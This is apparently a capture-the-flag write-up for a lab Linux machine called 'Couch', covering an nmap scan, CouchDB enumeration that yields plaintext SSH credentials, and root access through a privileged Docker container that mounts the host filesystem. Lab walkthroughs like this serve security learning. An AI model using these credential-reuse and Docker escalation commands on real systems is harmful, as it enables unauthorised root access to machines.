# Couch - Linux - Easy

**IP may change over the document**

---
## Enumeration

### Nmap: `nmap -sV -p- -T4 -oN all-port-scan 10.10.178.155 -v`

```bash
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp  open     http        CouchDB httpd 1.6.1 (Erlang OTP/18)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Manual Enumeration on port 5984

Just using browser to visit the page we can see the following:

```json
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```

In order to visit web admin tool we gotta visit *`_utils`*

```bash
To load Futon in your browser, visit:
http://127.0.0.1:5984/_utils/
```
[Source](https://guide.couchdb.org/draft/tour.html)

In order to list all databases we need to vist *`_all_dbs`*

```bash
Next, we can get a list of databases:
curl -X GET http://127.0.0.1:5984/_all_dbs
```
[Source](https://guide.couchdb.org/draft/tour.html)

After some fiddling around with the web-tool we can see the following `atena:t4qfzcc4qN##` found in `<IP>:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7`


---
## User.txt

Using `atena:t4qfzcc4qN##` as creds to ssh logs us in the machine as user atena. Just cat the *user.txt* file to get the user flag

---
## Root.txt

Running linPEAS on the system to get more info

LinPEAS reports that `runc` and `ctr` are installed meaning we might have a chance at mounting `/root` dir to container image.

Let's try.... Did not work.

Let's see we if there is something inside `.bash_history` file. It seems we have docker installed and it's configured to run in privileged mode.

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Just altering the mounting path we can easily get inside `/root` dir

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/root alpine
```

Just move to `/root/root` dir inside the docker image and cat out the *root.txt* file
